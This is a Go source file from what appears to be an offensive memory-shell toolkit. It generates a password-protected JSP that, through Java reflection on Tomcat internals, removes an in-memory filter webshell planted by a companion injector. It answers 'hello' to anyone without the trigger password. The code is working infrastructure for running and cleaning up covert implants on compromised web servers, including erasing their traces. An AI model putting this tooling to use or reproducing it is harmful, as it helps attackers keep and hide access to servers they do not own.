package memshell

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"strings"
)

// GenerateRemover 生成内存马卸载器 JSP（与注入器同触发协议：GET ?<TriggerParam>=<密码>）。
// 语义：按 FilterName 从 StandardContext 移除 FilterDef/FilterMap 并剔除 filterConfigs，
// 与注入器的反射注册路径对称；仅支持 jsp-tomcat-filter（Tomcat 7-9）。
func GenerateRemover(kind Kind, password, filterName, watermark string) (*Payload, error) {
	kind, err := NormalizeKind(string(kind))
	if err != nil {
		return nil, err
	}
	if kind != KindTomcatFilter {
		return nil, fmt.Errorf("unsupported memshell kind %q (remover only supports %s)", kind, KindTomcatFilter)
	}
	password = strings.TrimSpace(password)
	if password == "" {
		return nil, fmt.Errorf("password 必填（内存马鉴权口令）")
	}
	if err = assertSafeLiteral(password); err != nil {
		return nil, fmt.Errorf("password: %w", err)
	}
	filterName = strings.TrimSpace(filterName)
	if filterName == "" {
		return nil, fmt.Errorf("filter_name 必填（待卸载内存马标识）")
	}
	if err = assertSafeLiteral(filterName); err != nil {
		return nil, fmt.Errorf("filter_name: %w", err)
	}

	content := strings.NewReplacer(
		"{{WATERMARK}}", sanitizeWatermark(watermark),
		"{{PASSWORD}}", password,
		"{{FILTER_NAME}}", filterName,
		"{{TRIGGER_PARAM}}", TriggerParam,
	).Replace(tomcatFilterRemoverTemplate)
	sum := sha256.Sum256([]byte(content))
	return &Payload{
		Content:    []byte(content),
		Kind:       kind,
		Password:   password,
		FilterName: filterName,
		SHA256:     hex.EncodeToString(sum[:]),
		TemplateID: "tomcat-filter-proxy-remover",
	}, nil
}

// assertSafeLiteral 模板字面量防线：密码/Filter 名嵌入 equals 比较串，仅放行字母数字下划线。
func assertSafeLiteral(v string) error {
	for _, r := range v {
		if r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' || r == '_' {
			continue
		}
		return fmt.Errorf("包含非法字符 %q（仅允许字母数字下划线）", r)
	}
	return nil
}

// tomcatFilterRemoverTemplate 与注入器反射路径对称的卸载器：
// filterConfigs 剔除（连接不再回调）→ filterMaps 按名移除（URL 不再命中）→ filterDefs 移除。
// findFilterMaps/findFilterDefs 返回数组副本，遍历中删除安全。
const tomcatFilterRemoverTemplate = `<%-- {{WATERMARK}} remove --%>
<%@ page import="java.lang.reflect.*, java.util.*, javax.servlet.*" %>
<%
String pw = request.getParameter("{{TRIGGER_PARAM}}");
if (pw != null && pw.equals("{{PASSWORD}}")) {
    final String fName = "{{FILTER_NAME}}";
    try {
        ServletContext sc = request.getServletContext();
        Field fCtx = sc.getClass().getDeclaredField("context");
        fCtx.setAccessible(true);
        Object appCtx = fCtx.get(sc);
        Field fStd = appCtx.getClass().getDeclaredField("context");
        fStd.setAccessible(true);
        Object stdCtx = fStd.get(appCtx);

        int removedMaps = 0;
        try {
            Class<?> filterMapCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            Object[] maps = (Object[]) stdCtx.getClass().getMethod("findFilterMaps").invoke(stdCtx);
            Method rmMap = stdCtx.getClass().getMethod("removeFilterMap", filterMapCls);
            for (Object m : maps) {
                String fn = (String) filterMapCls.getMethod("getFilterName").invoke(m);
                if (fName.equals(fn)) { rmMap.invoke(stdCtx, m); removedMaps++; }
            }
        } catch (Exception ignore) { /* filterMaps 结构差异不阻断后续清理 */ }

        try {
            Class<?> filterDefCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            Object[] defs = (Object[]) stdCtx.getClass().getMethod("findFilterDefs").invoke(stdCtx);
            Method rmDef = stdCtx.getClass().getMethod("removeFilterDef", filterDefCls);
            for (Object d : defs) {
                String fn = (String) filterDefCls.getMethod("getFilterName").invoke(d);
                if (fName.equals(fn)) { rmDef.invoke(stdCtx, d); }
            }
        } catch (Exception ignore) { }

        boolean cfgGone = false;
        try {
            Field fCfgs = stdCtx.getClass().getDeclaredField("filterConfigs");
            fCfgs.setAccessible(true);
            Map cfgs = (Map) fCfgs.get(stdCtx);
            cfgGone = (cfgs.remove(fName) != null);
        } catch (Exception ignore) { }

        out.println("MEMSHELL_REMOVE_OK:" + fName + ":maps=" + removedMaps + ":cfg=" + cfgGone);
    } catch (Exception e) {
        out.println("MEMSHELL_REMOVE_FAIL:" + e);
    }
} else {
    out.println("hello");
}
%>`
